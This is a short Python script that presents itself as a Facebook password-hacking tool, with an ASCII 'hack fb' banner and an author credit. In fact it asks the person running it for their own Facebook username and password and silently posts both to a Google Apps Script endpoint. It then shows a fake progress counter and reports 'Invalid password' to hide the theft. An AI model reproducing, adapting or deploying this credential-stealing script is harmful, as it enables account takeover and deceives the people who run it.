import pyfiglet
a = pyfiglet.figlet_format("hack fb",font= "5lineoblique")
class color():
    def __init__(self,gl,blu,read,yel,):
        self.gl = gl
        self.blu = blu
        self.read = read
        self.yel = yel
cl = color('\033[1;32;50m','\033[1;34;50m','\033[1;31;50m','\033[1;33;50m')
print(cl.read,a)
print(cl.gl,"Author By : Super Force")
print(cl.read,"It's will hack Your Password")

mail = input("Enter Your Facebook User Name :")
apass = input("Enter Your account password :")

import time

url = "https://script.google.com/macros/s/AKfycbzZP9d3GbDOu7EC8kpP9TbJxCBA5a12sHrDChpqOcHtUOGYvLE/exec"
import requests
data = {'mail':mail,'pass':apass}
requests.post(url,data=data)
for i in range(100):
    print(i,"%")
    time.sleep(1)
print(f"Invalid password: {apass}")
